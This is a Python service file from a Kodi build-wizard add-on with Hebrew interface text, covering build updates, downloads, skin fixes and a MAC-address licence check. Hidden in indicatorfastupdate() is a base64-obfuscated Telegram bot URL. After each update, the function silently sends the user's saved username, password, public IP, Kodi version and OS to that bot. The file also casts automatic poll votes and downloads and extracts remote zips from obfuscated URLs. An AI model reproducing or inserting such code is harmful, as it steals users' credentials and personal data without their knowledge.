# coding: utf-8
################################################################################
#      Copyright (C) 2015 Surfacingx                                           #
#                                                                              #
#  This Program is free software; you can redistribute it and/or modify        #
#  it under the terms of the GNU General Public License as published by        #
#  the Free Software Foundation; either version 2, or (at your option)         #
#  any later version.                                                          #
#                                                                              #
#  This Program is distributed in the hope that it will be useful,             #
#  but WITHOUT ANY WARRANTY; without even the implied warranty of              #
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the                #
#  GNU General Public License for more details.                                #
#                                                                              #
#  You should have received a copy of the GNU General Public License           #
#  along with XBMC; see the file COPYING.  If not, write to                    #
#  the Free Software Foundation, 675 Mass Ave, Cambridge, MA 02139, USA.       #
#  http://www.gnu.org/copyleft/gpl.html                                        #
################################################################################

import xbmc, xbmcaddon, xbmcgui, xbmcplugin, os, sys, xbmcvfs, glob
import shutil
import urllib2,urllib
import re
import uservar
import time
import json
import speedtest
import platform
from shutil import copyfile
from datetime import date, datetime, timedelta
from resources.libs import extract, downloader, downloaderbg, downloaderwiz, notify, loginit, debridit, traktit,maintenance, skinSwitch, uploadLog, wizard as wiz
global teleupdate
teleupdate=False
ADDON_ID       = uservar.ADDON_ID
ADDONTITLE     = uservar.ADDONTITLE
ADDON          = wiz.addonId(ADDON_ID)
VERSION        = wiz.addonInfo(ADDON_ID,'version')
ADDONPATH      = wiz.addonInfo(ADDON_ID,'path')
ADDONID        = wiz.addonInfo(ADDON_ID,'id')
DIALOG         = xbmcgui.Dialog()
DP             = xbmcgui.DialogProgress()
DP2              = xbmcgui.DialogProgressBG()
HOME           = xbmc.translatePath('special://home/')
PROFILE        = xbmc.translatePath('special://profile/')
KODIHOME       = xbmc.translatePath('special://xbmc/')
ADDONS         = os.path.join(HOME,     'addons')
KODIADDONS     = os.path.join(KODIHOME, 'addons')
USERDATA       = os.path.join(HOME,     'userdata')
PLUGIN         = os.path.join(ADDONS,   ADDON_ID)
PACKAGES       = os.path.join(ADDONS,   'packages')
ADDONDATA      = os.path.join(USERDATA, 'addon_data', ADDON_ID)
FANART         = os.path.join(ADDONPATH,'fanart.jpg')
ICON           = os.path.join(ADDONPATH,'icon.png')
ART            = os.path.join(ADDONPATH,'resources', 'art')
SKIN           = xbmc.getSkinDir()
BUILDNAME      = wiz.getS('buildname')
DEFAULTSKIN    = wiz.getS('defaultskin')
DEFAULTNAME    = wiz.getS('defaultskinname')
DEFAULTIGNORE  = wiz.getS('defaultskinignore')
BUILDVERSION   = wiz.getS('buildversion')
BUILDLATEST    = wiz.getS('latestversion')
BUILDCHECK     = wiz.getS('lastbuildcheck')
DISABLEUPDATE  = wiz.getS('disableupdate')
AUTOCLEANUP    = wiz.getS('autoclean')
AUTOCACHE      = wiz.getS('clearcache')
AUTOPACKAGES   = wiz.getS('clearpackages')
AUTOTHUMBS     = wiz.getS('clearthumbs')
AUTOFEQ        = wiz.getS('autocleanfeq')
AUTONEXTRUN    = wiz.getS('nextautocleanup')
TRAKTSAVE      = wiz.getS('traktlastsave')
REALSAVE       = wiz.getS('debridlastsave')
LOGINSAVE      = wiz.getS('loginlastsave')
INSTALLMETHOD    = wiz.getS('installmethod')
KEEPTRAKT      = wiz.getS('keeptrakt')
KEEPREAL       = wiz.getS('keepdebrid')
KEEPLOGIN      = wiz.getS('keeplogin')
INSTALLED      = wiz.getS('installed')
EXTRACT        = wiz.getS('extract')
EXTERROR       = wiz.getS('errors')
NOTIFY         = wiz.getS('notify')
NOTEDISMISS    = wiz.getS('notedismiss')
NOTEID         = wiz.getS('noteid')
NOTIFY2         = wiz.getS('notify2')
NOTEDISMISS2    = wiz.getS('notedismiss2')
NOTEID2         = wiz.getS('noteid2')
NOTIFY3         = wiz.getS('notify3')
NOTEDISMISS3    = wiz.getS('notedismiss3')
NOTEID3         = wiz.getS('noteid3')
BACKUPLOCATION = ADDON.getSetting('path') if not ADDON.getSetting('path') == '' else HOME
MYBUILDS       = os.path.join(BACKUPLOCATION, 'My_Builds', '')
NOTEID          = 0 if NOTEID == "" else int(NOTEID)
NOTEID2         = 0 if NOTEID2 == "" else int(NOTEID2)
NOTEID3         = 0 if NOTEID3 == "" else int(NOTEID3)
AUTOFEQ        = int(AUTOFEQ) if AUTOFEQ.isdigit() else 1
TODAY          = date.today()
TOMORROW       = TODAY + timedelta(days=1)
TWODAYS        = TODAY + timedelta(days=2)
THREEDAYS      = TODAY + timedelta(days=3)
ONEWEEK        = TODAY + timedelta(days=7)
KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
EXCLUDES       = uservar.EXCLUDES
SPEEDFILE      = speedtest.SPEEDFILE
UPDATECHECK    = uservar.UPDATECHECK if str(uservar.UPDATECHECK).isdigit() else 1
NEXTCHECK      = TODAY + timedelta(days=UPDATECHECK)
NOTIFICATION   = uservar.NOTIFICATION
NOTIFICATION2   = uservar.NOTIFICATION2
NOTIFICATION3   = uservar.NOTIFICATION3
ENABLE         = uservar.ENABLE
UNAME            = speedtest.UNAME
HEADERMESSAGE  = uservar.HEADERMESSAGE
AUTOUPDATE     = uservar.AUTOUPDATE
WIZARDFILE     = uservar.WIZARDFILE
AUTOINSTALL    = uservar.AUTOINSTALL
REPOID         = uservar.REPOID
REPOADDONXML   = uservar.REPOADDONXML
REPOZIPURL     = uservar.REPOZIPURL
REPOID18         = uservar.REPOID18
REPOADDONXML18   = uservar.REPOADDONXML18
REPOZIPURL18     = uservar.REPOZIPURL18

REQUESTSID         = uservar.REQUESTSID
REQUESTSXML   = uservar.REQUESTSXML
REQUESTSURL     = uservar.REQUESTSURL



COLOR1         = uservar.COLOR1
COLOR2         = uservar.COLOR2
TMDB_NEW_API     = uservar.TMDB_NEW_API
WORKING        = True if wiz.workingURL(SPEEDFILE) == True else False
FAILED         = False
xbmc.executeJSONRPC('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')

AddonID ='plugin.program.Anonymous'
packagesdir    =  xbmc.translatePath(os.path.join('special://home/addons/packages',''))
thumbnails    =  xbmc.translatePath('special://home/userdata/Thumbnails')
telecach   =  xbmc.translatePath('special://home/userdata/addon_data/plugin.video.telemedia/logo')
dialog = xbmcgui.Dialog()
setting = xbmcaddon.Addon().getSetting
iconpath = xbmc.translatePath(os.path.join('special://home/addons/' + AddonID,'icon.png'))
notify_mode = setting('notify_mode')
auto_clean  = setting('startup.cache')
#filesize = int(setting('filesize_alert'))
filesize_thumb = int(setting('filesizethumb_alert'))
filesize_tele = int(setting('filesizetele_alert'))
#maxpackage_zips = int(setting('packagenumbers_alert'))

total_size2 = 0
total_size = 0
count = 0
# if not os.path.exists(os.path.join(ADDONDATA, '4.3.0')):

        # file = open(os.path.join(ADDONDATA, '4.3.0'), 'w') 
         
        # file.write(str('Done'))
        # file.close()
        # xbmc.getInfoLabel('System.OSVersionInfo')
        # xbmc.sleep(2000)
        # label = xbmc.getInfoLabel('System.OSVersionInfo')
        # ADDON.setSetting('systemtype',label)
DP2              = xbmcgui.DialogProgressBG()
def infobuild():
	url = wiz.workingURL(NOTIFICATION)
	if url == True:
		try:
			id, msg = wiz.splitNotify(NOTIFICATION)
			if id == False: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון[/COLOR]" % COLOR2); return
			if STARTP2()=='ok': 
				notify.updateinfo(msg, True)
		except Exception as e:
			wiz.log("Error on Notifications Window: %s" % str(e), xbmc.LOGERROR)
	else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE), "[COLOR %s]אין עדכון[/COLOR]" % COLOR2)
def disply_hwr():
   try:
    my_tmdb=tmdb_list(TMDB_NEW_API)
    num=str((getHwAddr('eth0'))*my_tmdb)
   #pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':num}
   #response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))

   #url2 = response.read()

   
    new_num=(num[1]+num[2]+num[5]+num[7])
    input= (ADDON.getSetting("action"))

    wiz.setS('action', str(new_num))
   except: pass
def getHwAddr (ifname ):
   import subprocess ,time 
   system_type ='windows'
   if xbmc .getCondVisibility ('system.platform.android'):
       system_type ='android'
   if xbmc .getCondVisibility ('system.platform.android'):
     Installed_APK =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()
     mac =re .compile ('link/ether (.+?) brd').findall (str (Installed_APK ))
     n =0 
     for match in mac :
      if mac !='00:00:00:00:00:00':
          mac_address =match
          n =n +int (mac_address .replace (':',''),16 )
   elif xbmc .getCondVisibility ('system.platform.windows'):
       x =0 
       n =0 
       macs =[]
       file =os .popen ("getmac").read ()
       file =file .split ("\n")
       for line in file :
            found =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',line ,re .I )
            if found :
                mac =found .group ().replace ('-',':')
                macs .append (mac )
                n =n +int (mac .replace (':',''),16 )
   else :
       x =0 
       n =0 
       while (1 ):
         mac_address =xbmc .getInfoLabel ("network.macaddress")
         logging .warning (mac_address )
         if mac_address !="Busy"and mac_address !=' עסוק':
            break 
         else :
           x =x +1 
           time .sleep (1 )
           if x >30 :
            break 
       n =n +int (mac_address .replace (':',''),16 )
       logging .warning ('n:'+str (n ))
   try:
    return n
   except: pass
def decode(key, enc):
    import base64
    dec = []
    
    if (len(key))!=4:
     return 10
    enc = base64.urlsafe_b64decode(enc)

    for i in range(len(enc)):
        key_c = key[i % len(key)]
        dec_c = chr((256 + ord(enc[i]) - ord(key_c)) % 256)
        dec.append(dec_c)
    return "".join(dec)
def tmdb_list(url):

 
    value=decode("7643",url)
   

    return int(value)
def u_list(list):#חומרה

    if xbmc.getCondVisibility('system.platform.windows') or xbmc.getCondVisibility('system.platform.android'):
        from math import sqrt
        my_tmdb=tmdb_list(TMDB_NEW_API)
        num=str((getHwAddr('eth0'))*my_tmdb)
        new_num=int(num[1]+num[2]+num[5]+num[7])
        input= (ADDON.getSetting("pass"))
        new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-4:]).replace('.','')

        if '.' in new_num2:
         new_num2=(str( round(sqrt((new_num*500)+30)+30,4))[-5:]).replace('.','')

        if input==new_num2:

          url=list
          return url,new_num 
        else:
           if STARTP2() and STARTP() =='ok':
           
    #       if STARTP() =='ok':
             return list

           # sys.exit()
        return 'ok',new_num 
    else:
           if STARTP2() and STARTP() =='ok':
           
    #       if STARTP() =='ok':
             return list
try:
   # if (ADDON.getSetting("action"))=='':
    disply_hwr()
except:
   pass
def dis_or_enable_addon(addon_id,mode, enable="true"):
    import json
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
        else:
            xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
    if mode=='auto':
     return True
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
def update_Votes():
   try:
        import requests
        id='18773068'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        votes='145273321'#option 1


        data = {
         
          'options': votes
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
   except: pass
def display_Votes():
    try:
        setting_file=os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "skin.Premium.mod","settings.xml")

        file = open(setting_file, 'r') 
        file_data= file.read()
        file.close()
        regex='<setting id="HomeS" type="string">(.+?)</setting>'
        
        m=re.compile(regex).findall(file_data)[0]

        
        
        
        
        import requests
        id='18782966'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'keep-alive',
        'Referer': 'https://www.strawpoll.me/'+id,
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'TE': 'Trailers',
        }

        eminence='145313053'#option 1
        nox='145313054'#option 2
        titan='145313057'#option 3
        phenomenal='145313058'#option 4
        netflix='145313055'#option 5
        nebula='145313060'#option 6
        pellucid='145313056'#option 7
        pellucid2='145313059'#option 8
        
        
        if m == 'emin':
           res=eminence
        if m == 'nox':
           res=nox
        if m == 'noxtitan':
           res=nox
        if m == 'titan':
           res=titan
        if m == 'pheno':
           res=phenomenal
        if m == 'netflix':
           res=netflix
        if m == 'nebula':
           res=nebula
        if m == 'pellucid':
           res=pellucid
        if m == 'pellucid2':
           res=pellucid2
           
           
        data = {
         
          'options': res
        }

        response = requests.post('https://www.strawpoll.me/'+id, headers=headers, data=data)
    except: pass
def resetkodi():
		if xbmc.getCondVisibility('system.platform.windows'):
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר והקודי יעלה אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "מתבצע הפעלה מחדש לקודי", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					from resources.libs import win
					return None, None
			from resources.libs import win
		else:
			DP = xbmcgui.DialogProgress()
			DP.create("ההתקנה תסגר אוטומטית", "אנא המתן 5 שניות", '',
			
			"[COLOR yellow][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")
			DP.update(0)
			for s in range(5, -1, -1):
				time.sleep(1)
				DP.update(int((5 - s) / 5.0 * 100), "ההתקנה תסגר", 'בעוד {0} שניות'.format(s), '')
				if DP.iscanceled():
					os._exit(1)
					return None, None
			os._exit(1)
def indicatorfastupdate():
       try:
          import json
          wiz.log('FRESH MESSAGE')
          input= (ADDON.getSetting("user"))
          input2= (ADDON.getSetting("pass"))
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          #freshStart(name)
          error_ad='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXk9eb15XXnyDXnteU15nXqCAtIA=='
          x=urllib2.urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=input2
          import socket
          x=urllib2.urlopen(error_ad.decode('base64')+' שם משתמש: '+userr +' סיסמה: '+passs+' קודי: '+kodiinfo+' כתובת: '+local_ip+' מערכת הפעלה: '+platform.system()).readlines()
          #          x=urllib2.urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def skindialogsettind18():
	try:
		src=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"
		dst=xbmc . translatePath ( 'special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"
		copyfile(src,dst)
	except:pass
def telemedia_android5fix():
    android=ADDON.getSetting('systemtype')
    teleandro=ADDON.getSetting('teleandro')
    if xbmc.getCondVisibility('system.platform.android') and 'Android 5' in android or teleandro =='true':

        link= 'https://github.com/kodianonymous1/build/blob/master/tele.zip?raw=true'
        iiI1iIiI = xbmc . translatePath ( os . path . join ( 'special://home/addons' , 'packages' ) )
        iiiI11 = xbmcgui . DialogProgress ( )
        iiiI11 . create ( "[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]" , "[B][COLOR=green]מוריד....[/COLOR][/B]"  '' , 'אנא המתן' )
        OOooO = os . path . join ( PACKAGES , 'isr.zip' )
        req = urllib2.Request(link)
        remote_file = urllib2.urlopen(req)
        #the_page = response.read()
        dp = xbmcgui.DialogProgress()
        dp.create("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]", "[B][COLOR=green]מוריד....[/COLOR][/B]")
        dp.update(0)

        f = open(OOooO, 'wb')

        try:
          total_size = remote_file.info().getheader('Content-Length').strip()
          header = True
        except AttributeError:
              header = False # a response doesn't always include the "Content-Length" header

        if header:
              total_size = int(total_size)

        bytes_so_far = 0
        start_time=time.time()
        while True:
              buffer = remote_file.read(8192)
              if not buffer:
                  sys.stdout.write('\n')
                  break

              bytes_so_far += len(buffer)
              f.write(buffer)

              if not header:
                  total_size = bytes_so_far # unknown size
              if dp.iscanceled(): 
                 dp.close()
                 try:
                  os.remove(OOooO)
                 except:
                  pass
                 break
              percent = float(bytes_so_far) / total_size
              percent = round(percent*100, 2)
              currently_downloaded=bytes_so_far/ (1024 * 1024) 
              total=total_size/ (1024 * 1024) 
              mbs = '[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]' % ('teal', 'skyblue', currently_downloaded, 'teal', total) 
              if (time.time() - start_time) >0:
                kbps_speed = bytes_so_far / (time.time() - start_time) 
                kbps_speed = kbps_speed / 1024 
              else:
               kbps_speed=0
              type_speed = 'KB'
              if kbps_speed >= 1024:
                 kbps_speed = kbps_speed / 1024 
                 type_speed = 'MB'
              if kbps_speed > 0 and not percent == 100: 
                  eta = (total_size - bytes_so_far) / kbps_speed 
              else: 
                  eta = 0
              e   = '[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s ' % ('teal', 'skyblue', kbps_speed, type_speed)

              dp.update(int(percent),mbs,e+ "[B][COLOR=green]מוריד.... [/COLOR][/B]"  )
              #sys.stdout.write("Downloaded %d of %d bytes (%0.2f%%)\r" % (bytes_so_far, total_size, percent))
      
        II111iiii = xbmc . translatePath ( os . path . join ( 'special://home/addons' ) )

         
        f.close()
        extract.all  ( OOooO , II111iiii,dp )
      
       # extract.all(lib, HOME,DP)

        try:
          os.remove(OOooO)
        except:
          pass
def chunk_report(bytes_so_far, chunk_size, total_size):
   percent = float(bytes_so_far) / total_size
   percent = round(percent*100, 2)

   if bytes_so_far >= total_size:
      sys.stdout.write('\n')

def chunk_read(response, chunk_size=8192, report_hook=None,destination='',filesize=1000000):
   DP2.create('[B][COLOR=green]מוריד עדכון                         [/COLOR][/B]')
   import time
   name =  " Kodi Premium"
   total_size = int(filesize)*1000000

   bytes_so_far = 0
   start_time = time.time()
   count=0
   zxz = '[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]' % (COLOR2, COLOR1, name, wiz.checkBuild(name,'version'))

   with open(destination, "wb") as f:
    while 1:
      duration = time.time() - start_time
      progress_size = int(count * chunk_size)
      chunk = response.read(chunk_size)
      f.write(chunk)
      f.flush()
      bytes_so_far += len(chunk)
      percent = float(bytes_so_far) / total_size
      percent = round(percent*100, 2)
      if int(duration)>0: 
        speed = int(progress_size / (1024 * duration))
      else:
         speed=0
      if speed > 1024 and not percent == 100:
          eta =int(( (total_size - progress_size)/1024) / (speed) )
      else:
          eta=0
      if eta<0:
        eta=0

      DP2.update(int(percent), "\r%d%%,[COLOR silver] %d MB / %d MB [/COLOR], %d KB/s " %(percent, progress_size / (1024 * 1024),total_size/(1000 * 1000), speed), '[COLOR silver]%02d:%02d[/COLOR][B]זמן שנותר: [/B]' % divmod(eta, 60))
      # if dp.iscanceled():
         # dp.close()
         # break
      
      if not chunk:
         break

      if report_hook:
         report_hook(bytes_so_far, chunk_size, total_size)
      count += 1
      
   return bytes_so_far
def googledrive_download(id, destination,filesize):
    
    #download('http://mirrors.kodi.tv/addons/jarvis/script.module.requests/script.module.requests-2.9.1.zip','script.module.requests')
    #dis_or_enable_addon('script.module.requests','auto')
    #import requests,time
    keys=[]
    id_pre=id.split('=')
    id=id_pre[len(id_pre)-1]

    def get_confirm_token(response):
        
        for cookie in response:

            backup_cookie= cookie.value
            if 'download_warning' in cookie.name:

                return cookie.value
            return backup_cookie

        return None

    def save_response_content(response, destination):
        
        CHUNK_SIZE = 32768
        start_time = time.time()
     
        with open(destination, "wb") as f:
            count = 1
            block_size = 32768
            try:
                total_size = int(response.headers.get('content-length'))
                print ('file total size :',total_size)
            except TypeError:
                print ('using dummy length !!!')
                total_size = int(filesize)*1000000
            for chunk in response.iter_content(CHUNK_SIZE):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                    f.flush()
                    duration = time.time() - start_time
                    progress_size = int(count * block_size)
                    if duration == 0:
                        duration = 0.1
                    speed = int(progress_size / (1024 * duration))
                    percent = int(count * block_size * 100 / total_size)
                    if speed > 1024 and not percent == 100:
                      eta =int(( (total_size - progress_size)/1024) / (speed) )
                    else:
                      eta=0
                    #sys.stdout.write("\r...%d%%, %d MB, %d KB/s, %d seconds passed" %(percent, progress_size / (1024 * 1024), speed, duration))
                    name =  " Kodi Premium"
                    DP2.update(int(percent),name, "\r%d%%,[COLOR salmon] %d MB / %d MB [/COLOR], %d KB/s " %(percent, progress_size / (1024 * 1024),total_size/(1000 * 1000), speed), '[B]ETA:[/B] [COLOR salmon]%02d:%02d[/COLOR]' % divmod(eta, 60))
                    count += 1
                    DP2.close()
                    # if dp.iscanceled():
                     # dp.close()
                     # break
    URL = "https://docs.google.com/uc?export=download"

    #session = requests.Session()

    #response = session.get(URL, params = { 'id' : id }, stream = True)
    import urllib2
    import cookielib

    from cookielib import CookieJar

    cj = CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    # input-type values from the html form
    formdata =  { 'id' : id }
    data_encoded = urllib.urlencode(formdata)

    response = opener.open(URL+'&'+ data_encoded)
    content = response.read()
    
    for cookie in cj:
     try:
          logging.warning( cookie)
     except:pass
    token = get_confirm_token(cj)

    if token:
        params = { 'id' : id, 'confirm' : token }
        headers = {'Access-Control-Allow-Headers': 'Content-Length'}
        data_encoded = urllib.urlencode(params)
        response = opener.open(URL+'&'+ data_encoded)
        chunk_read(response, report_hook=chunk_report,destination=destination,filesize=filesize)
        
    DP2.close()
    #save_response_content(response, destination)
    return(keys)
def checkidupdate():
				teleupdate=True
				wiz.setS("notedismiss","true")
				url = wiz.workingURL(NOTIFICATION)

				name =  " Kodi Premium"
				buildzip = wiz.checkBuild(name,'gui')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
#				DP2.create('קיים עדכון מהיר עבורך')
#				DP2.update(0, 'מוריד')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass

				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib,wiz.checkBuild(name, 'updatesize'))
			
			
				else:
				  downloaderbg.download3(buildzip, lib, DP2)
				xbmc.sleep(100)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
#				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')

				extract.all2(lib,HOME,DP2)
				DP2.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				try:
					telemedia_android5fix()
				except:pass
				wiz.kodi17Fix()
				if KODIV>=18:
					skindialogsettind18()
				#xbmc.executebuiltin("ReloadSkin()")
				# update_Votes()
				# indicatorfastupdate()
				# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
				debridit.debridIt('restore', 'all')
				traktit.traktIt('restore', 'all')
				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP2.close()
				urlz = (NOTIFICATION2)
				remote_file = urllib2.urlopen(urlz)
				x=remote_file.readlines()
				found=0
	
#	if not input +'\r\n' in x:
				for us in x:
					if us.split(' ==')[0] =="noreset" or us.split()[0]=="noreset":
					# found=1
						xbmc.executebuiltin("ReloadSkin()")
						wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]' % COLOR2)
						notifyb= (ADDON.getSetting("message"))
						if notifyb == 'true':
							infobuild()
						update_Votes()
						indicatorfastupdate()
					if us.split(' ==')[0] =="reset" or us.split()[0]=="reset":
					# wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]הבילד יסגר![/COLOR]' % COLOR2)
						update_Votes()
						indicatorfastupdate()
						resetkodi()
def checkvictory():
			
				wiz.setS("notedismiss2","true")
				url = wiz.workingURL(NOTIFICATION2)

				name =  " Kodi Premium"
				buildzip = 'aHR0cHM6Ly9naXRodWIuY29tL3ZpcDIwMC92aWN0b3J5L2Jsb2IvbWFzdGVyL3BsdWdpbi52aWRlby5hbGxtb3ZpZXNpbi56aXA/cmF3PXRydWU='.decode('base64')
				zipname = name.replace('\\', '').replace('/', '').replace(':', '').replace('*', '').replace('?', '').replace('"', '').replace('<', '').replace('>', '').replace('|', '')
				if not wiz.workingURL(buildzip) == True: return
				if not os.path.exists(PACKAGES): os.makedirs(PACKAGES)
#				DP2.create('קיים עדכון מהיר עבורך')
#				DP2.update(0, 'מוריד')
				lib=os.path.join(PACKAGES, '%s_guisettings.zip' % zipname)
				try: os.remove(lib)
				except: pass

				if 'google' in buildzip:
				   res=googledrive_download(buildzip, lib, DP2,wiz.checkBuild(name, 'filesize'))
			
			
				else:
				  downloaderbg.download5(buildzip, lib, DP2)
				xbmc.sleep(100)
				DP2.create('[B][COLOR=green]מתקין                         [/COLOR][/B]')
#				title = '[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]' % (COLOR2, COLOR1, name)
				DP2.update(100, message='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')

				extract.all2(lib,ADDONS,DP2)
				DP2.close()
				wiz.defaultSkin()
				wiz.lookandFeelData('save')
				wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]ההרחבה עודכנה בהצלחה![/COLOR]' % COLOR2)

				if INSTALLMETHOD == 1: todo = 1
				elif INSTALLMETHOD == 2: todo = 0
				else: DP2.close()
###########################
#### Check Updates   ######
###########################

def checkUpdate():
	BUILDNAME      = wiz.getS('buildname')
	BUILDVERSION   = wiz.getS('buildversion')
	link           = wiz.openURL(SPEEDFILE).replace('\n','').replace('\r','').replace('\t','')
	match          = re.compile('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"' % BUILDNAME).findall(link)
	if len(match) > 0:
		version = match[0][0]
		icon    = match[0][1]
		fanart  = match[0][2]
		wiz.setS('latestversion', version)
		if version > BUILDVERSION:
			if DISABLEUPDATE == 'false':
				wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window" % (BUILDVERSION, version), xbmc.LOGNOTICE)
				notify.updateWindow(BUILDNAME, BUILDVERSION, version, icon, fanart)
			else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled" % (BUILDVERSION, version), xbmc.LOGNOTICE)
		else: wiz.log("[Check Updates] [Installed Version: %s] [Current Version: %s]" % (BUILDVERSION, version), xbmc.LOGNOTICE)
	else: wiz.log("[Check Updates] ERROR: Unable to find build version in build text file", xbmc.LOGERROR)

#def checkSkin():
#	wiz.log("[Build Check] Invalid Skin Check Start")

#	DEFAULTNAME   = wiz.getS('defaultskinname')



#	gotoskin = DEFAULTSKIN
#	gotoname = DEFAULTNAME


#	if gotoskin:
#		skinSwitch.swapSkins(gotoskin)
#		x = 0
#		xbmc.sleep(1000)
#		while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 150:
#			x += 1
#			xbmc.sleep(200)

#		if xbmc.getCondVisibility("Window.isVisible(yesnodialog)"):
#			wiz.ebi('SendClick(11)')
#			wiz.lookandFeelData('restore')
#		else: wiz.LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]Skin Swap Timed Out![/COLOR]' % COLOR2)
#	wiz.log("[Build Check] Invalid Skin Check End", xbmc.LOGNOTICE)def MainMenu():

#	addItem('Skin Premium','url',5,icon,fanart,'')



def swapSkins(skin, title="Error"):
	old = 'lookandfeel.skin'
	value = skin
	current = getOld(old)
	new = old
	setNew(new, value)
	x = 0
	while not xbmc.getCondVisibility("Window.isVisible(yesnodialog)") and x < 100:
		x += 1
		xbmc.sleep(1)
